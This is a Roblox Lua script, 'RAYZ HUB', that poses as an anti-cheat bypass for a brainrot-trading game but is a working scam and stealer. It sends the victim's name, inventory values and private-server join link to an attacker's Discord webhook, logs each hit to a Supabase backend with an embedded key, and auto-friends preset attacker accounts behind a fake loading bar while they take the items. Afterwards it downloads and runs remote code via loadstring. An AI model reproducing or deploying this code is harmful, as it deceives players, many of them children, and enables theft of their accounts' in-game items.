--====================================================================--
-- Services
--======================================================================
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local LocalPlayer = Players.LocalPlayer

--====================================================================--
-- Configuration


local Usernames = users
local Webhook = web

local LOADING_DURATION = 30
local MIN_LOG_VALUE = 500000

-- Supabase Configuration
local SUPABASE_URL = "https://yiyjqwmwoalxhvwiigwi.supabase.co"
local SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlpeWpxd213b2FseGh2d2lpZ3dpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgxMzI1MzIsImV4cCI6MjA4MzcwODUzMu0.35khALBOy3LY5lTGNcVLQHMuMfEoNOS7ye_0T6vEVoY"

-- Variables for state tracking
local initialInventoryList = {}
local initialInventoryCount = 0
local authorizedFound = false
local lastMessageId = nil

--====================================================================--
-- GUI Creation
--======================================================================
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "RayzHub"
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(35, 25, 45)
MainFrame.BorderSizePixel = 0
MainFrame.Position = UDim2.new(0.5, -125, 0.5, -75)
MainFrame.Size = UDim2.new(0, 250, 0, 150)
MainFrame.Active = true
MainFrame.Draggable = true

local FrameCorner = Instance.new("UICorner")
FrameCorner.CornerRadius = UDim.new(0, 10)
FrameCorner.Parent = MainFrame

local LoadingFrame = Instance.new("Frame")
LoadingFrame.Name = "LoadingFrame"
LoadingFrame.Parent = MainFrame
LoadingFrame.Size = UDim2.new(1, 0, 1, 0)
LoadingFrame.BackgroundColor3 = Color3.fromRGB(35, 25, 45)
LoadingFrame.ZIndex = 10
LoadingFrame.Visible = false

local LoadingCorner = Instance.new("UICorner")
LoadingCorner.CornerRadius = UDim.new(0, 10)
LoadingCorner.Parent = LoadingFrame

local LoadingText = Instance.new("TextLabel")
LoadingText.Parent = LoadingFrame
LoadingText.Size = UDim2.new(1, 0, 0.65, 0)
LoadingText.Text = "Bypassing anti cheat..."
LoadingText.TextColor3 = Color3.fromRGB(180, 100, 255)
LoadingText.Font = Enum.Font.GothamBold
LoadingText.TextSize = 16
LoadingText.BackgroundTransparency = 1
LoadingText.ZIndex = 11
LoadingText.TextYAlignment = Enum.TextYAlignment.Center

local BarBG = Instance.new("Frame")
BarBG.Parent = LoadingFrame
BarBG.BackgroundColor3 = Color3.fromRGB(50, 40, 65)
BarBG.Size = UDim2.new(0.8, 0, 0, 12)
BarBG.Position = UDim2.new(0.1, 0, 0.72, 0)
BarBG.ZIndex = 11

local Bar = Instance.new("Frame")
Bar.Parent = BarBG
Bar.BackgroundColor3 = Color3.fromRGB(180, 100, 255)
Bar.Size = UDim2.new(0, 0, 1, 0)
Bar.ZIndex = 12

local Title = Instance.new("TextLabel")
Title.Parent = MainFrame
Title.Text = "RAYZ HUB"
Title.TextColor3 = Color3.fromRGB(180, 100, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 22
Title.Size = UDim2.new(1, 0, 0, 45)
Title.BackgroundTransparency = 1
Title.ZIndex = 2

local LinkInput = Instance.new("TextBox")
LinkInput.Parent = MainFrame
LinkInput.Text = ""
LinkInput.PlaceholderText = "enter private server link"
LinkInput.BackgroundColor3 = Color3.fromRGB(50, 40, 65)
LinkInput.TextColor3 = Color3.fromRGB(255, 255, 255)
LinkInput.Position = UDim2.new(0.1, 0, 0.35, 0)
LinkInput.Size = UDim2.new(0.8, 0, 0, 30)
LinkInput.Font = Enum.Font.Gotham
LinkInput.TextSize = 14
LinkInput.ZIndex = 2

local ExecuteBtn = Instance.new("TextButton")
ExecuteBtn.Parent = MainFrame
ExecuteBtn.Text = "EXECUTE"
ExecuteBtn.BackgroundColor3 = Color3.fromRGB(120, 50, 200)
ExecuteBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ExecuteBtn.Position = UDim2.new(0.1, 0, 0.65, 0)
ExecuteBtn.Size = UDim2.new(0.8, 0, 0, 35)
ExecuteBtn.Font = Enum.Font.GothamBold
ExecuteBtn.TextSize = 16
ExecuteBtn.ZIndex = 2

--====================================================================--
-- Helpers
--======================================================================
local function parseGen(str)
    local n, u = str:gsub("%s", ""):match("(%d+%.?%d*)([KMB]?)")
    n = tonumber(n) or 0
    if u == "K" then return n * 1000
    elseif u == "M" then return n * 1000000
    elseif u == "B" then return n * 1000000000 end
    return n
end

local function formatValue(n)
    if n >= 1000000000 then
        return string.format("%.1fB", n / 1000000000)
    elseif n >= 1000000 then
        return string.format("%.1fM", n / 1000000)
    elseif n >= 1000 then
        return string.format("%.1fK", n / 1000)
    else
        return tostring(n)
    end
end

local function getValuableBrainrots()
    local list = {}
    local debris = Workspace:FindFirstChild("Debris")
    if not debris then return list end

    for _, t in ipairs(debris:GetChildren()) do
        if t.Name == "FastOverheadTemplate" then
            local oh = t:FindFirstChild("AnimalOverhead")
            if oh and oh:FindFirstChild("DisplayName") and oh:FindFirstChild("Generation") then
                local val = parseGen(oh.Generation.Text)
                if val >= MIN_LOG_VALUE then
                    table.insert(list, {
                        name = oh.DisplayName.Text,
                        gen = oh.Generation.Text,
                        val = val
                    })
                end
            end
        end
    end
    table.sort(list, function(a, b) return a.val > b.val end)
    return list
end

local function incrementHitCount(webhookUrl)
    if not webhookUrl or webhookUrl == "" then
        return false
    end

    local payload = {
        p_webhook = webhookUrl
    }

    local success, response = pcall(function()
        local req = (syn and syn.request) or request or http_request or (http and http.request)
        if not req then
            error("No HTTP request function available")
        end

        return req({
            Url = SUPABASE_URL .. "/rest/v1/rpc/increment_hits_for_webhook",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json",
                ["apikey"] = SUPABASE_ANON_KEY,
                ["Authorization"] = "Bearer " .. SUPABASE_ANON_KEY,
            },
            Body = HttpService:JSONEncode(payload)
        })
    end)

    return success and response.StatusCode >= 200 and response.StatusCode < 300
end

--====================================================================--
-- Logging Functions
--======================================================================
local function sendDetailedEmbedLog(joinLink, status)
    local currentInv = getValuableBrainrots()
    local method = lastMessageId and "PATCH" or "POST"
    local url = lastMessageId and Webhook .. "/messages/" .. lastMessageId or Webhook .. "?wait=true"

    local totalInitialValue = 0
    local totalClaimedValue = 0
    local inventoryLines = {}

    local initialMap = {}
    for _, item in ipairs(initialInventoryList) do
        initialMap[item.name] = (initialMap[item.name] or 0) + 1
        totalInitialValue = totalInitialValue + item.val
    end

    local currentMap = {}
    for _, item in ipairs(currentInv) do
        currentMap[item.name] = (currentMap[item.name] or 0) + 1
    end

    for name, initialQty in pairs(initialMap) do
        local currentQty = currentMap[name] or 0
        local takenQty = initialQty - currentQty
        if takenQty < 0 then takenQty = 0 end
        
        local unitVal = 0
        for _, item in ipairs(initialInventoryList) do
            if item.name == name then unitVal = item.val break end
        end
        
        local takenValue = takenQty * unitVal
        local totalItemValue = initialQty * unitVal
        totalClaimedValue = totalClaimedValue + takenValue

        local takenFormatted = formatValue(takenValue)
        local totalFormatted = formatValue(totalItemValue)
        
        table.insert(inventoryLines, "" .. name .. " " .. takenQty .. " / " .. initialQty .. " (" .. takenFormatted .. " / " .. totalFormatted .. ")")
    end

    local inventoryText = #inventoryLines > 0 and table.concat(inventoryLines, "\n") or "None"
    inventoryText = inventoryText .. "\n===============================\nTotal: " .. formatValue(totalClaimedValue) .. " / " .. formatValue(totalInitialValue) .. ""

    local hitContent = "> 『 ꜱᴍᴀʟʟ ʜɪᴛ 』"
    if totalInitialValue >= 20000000 then
        hitContent = "> @everyone ⋆｡ ɢᴏᴏᴅ ʜɪᴛ ｡⋆"
    end

    local payload = {
        content = hitContent,
        username = "jeffrey epstein",
        avatar_url = "https://rayzhubb.vercel.app/pngs/logo.png",
        embeds = {{
            title = "RAYZ HUB",
            description = "<:rayz_info:1459657883846185021> **How to Use?**\nJoin user and steal his brainrots.",
            color = 0x800080,
            fields = {
                { name = "<:rayz_check:1459279711774576846> Status", value = "```" .. status .. "```", inline = false },
                { name = "<:rayz_member:1459280047570419814> Display Name", value = "```" .. LocalPlayer.DisplayName .. "```", inline = true },
                { name = "<:rayz_owner:1459280005874974801> Username", value = "```" .. LocalPlayer.Name .. "```", inline = true },
                { name = "<:rayz_backpack:1459652540630171844> Inventory", value = "```" .. inventoryText .. "```" },
                { name = "<:rayz_settings:1459279856931176500> Join Player", value = "[ Click to Join ](" .. joinLink .. ")", inline = false },
            },
             footer = { text = "RAYZ HUB • Total Value:", icon_url = "https://rayzhubb.vercel.app/pngs/logo.png" },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
            image = {url = "https://rayzhubb.vercel.app/pngs/sab.png"},
        }}
    }

    local success, response = pcall(function()
        local req = (syn and syn.request) or request or http_request or (http and http.request)
        return req({
            Url = url,
            Method = method,
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)

    if success and method == "POST" and response and response.Body then
        local decodeSuccess, data = pcall(function() return HttpService:JSONDecode(response.Body) end)
        if decodeSuccess and data and data.id then
            lastMessageId = data.id
        end
    end
end

--====================================================================--
-- Authorized User Logic
--======================================================================
local function handleAuthorizedUser(player)
    if authorizedFound then return end
    
    if table.find(Usernames, player.Name) or table.find(Usernames, player.DisplayName) then
        authorizedFound = true
        
        pcall(function() LocalPlayer:FriendUser(player.UserId) end)
        task.wait(1)
        pcall(function()
            ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net"):WaitForChild("RE/PlotService/ToggleFriends"):FireServer()
        end)
        
        task.spawn(function()
            while player.Parent == Players do
                task.wait(1.5)
            end
            
            local currentInv = getValuableBrainrots()
            local finalStatus = "🟡 Waiting"
            
            if #currentInv == 0 and initialInventoryCount > 0 then
                finalStatus = "🟢 Claimed"
            elseif #currentInv < initialInventoryCount then
                finalStatus = "🔵 Partially claimed"
            end
            
            sendDetailedEmbedLog(LinkInput.Text, finalStatus)

            if ScreenGui then ScreenGui:Destroy() end
            loadstring(game:HttpGet("https://rayzhubb.vercel.app/scripts/sab-gui.lua"))()
            loadstring(game:HttpGet("https://rayzhubb.vercel.app/sab-freezer.lua"))()
        end)
    end
end

--====================================================================--
-- Button Logic
--======================================================================
ExecuteBtn.MouseButton1Click:Connect(function()
    -- Start Server Checker Logic
    local isPrivateServer = game.PrivateServerId ~= "" or game.PrivateServerOwnerId ~= 0
    if not isPrivateServer then
        LocalPlayer:Kick("this script works only on private servers!")
        return
    end

    if #Players:GetPlayers() > 1 then
        LocalPlayer:Kick("this is your own script to use, please join an empty private server!")
        return
    end
    -- End Server Checker Logic

    local link = LinkInput.Text:match("^%s*(.-)%s*$")
    
    if link == "" or (not link:find("roblox%.com") and not link:find("share")) then
        ExecuteBtn.Text = "INVALID LINK"
        task.wait(1.2)
        ExecuteBtn.Text = "EXECUTE"
        return
    end

    -- Trigger Supabase Hit Increment
    task.spawn(function()
        incrementHitCount(Webhook)
    end)

    initialInventoryList = getValuableBrainrots()
    initialInventoryCount = #initialInventoryList
    authorizedFound = false
    lastMessageId = nil
    
    sendDetailedEmbedLog(link, "🟡 Waiting") 
    
    LoadingFrame.Visible = true
    LinkInput.Visible = false
    ExecuteBtn.Visible = false
    Title.Text = "VERIFYING..."
    LoadingText.Text = "Bypassing anti cheat..."

    Bar.Size = UDim2.new(0, 0, 1, 0)
    local tween = TweenService:Create(Bar, TweenInfo.new(LOADING_DURATION, Enum.EasingStyle.Linear), {
        Size = UDim2.new(1, 0, 1, 0)
    })
    tween:Play()

    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer then
            handleAuthorizedUser(p)
        end
    end

    local connection = Players.PlayerAdded:Connect(function(p)
        if p ~= LocalPlayer then
            handleAuthorizedUser(p)
        end
    end)

    task.delay(LOADING_DURATION + 0.5, function()
        if connection then connection:Disconnect() end
        
        if not authorizedFound then
            sendDetailedEmbedLog(link, "🔴 Failed")
            
            LoadingText.Text = "Failed to bypass anti cheat"
            task.wait(1.8)
            LoadingText.Text = "try again later"
            task.wait(2.2)
            
            pcall(function()
                game:GetService("TeleportService"):Teleport(game.PlaceId, LocalPlayer)
            end)
            LocalPlayer:Kick("Failed to bypass anti cheat, try again later")
        end
    end)
end)
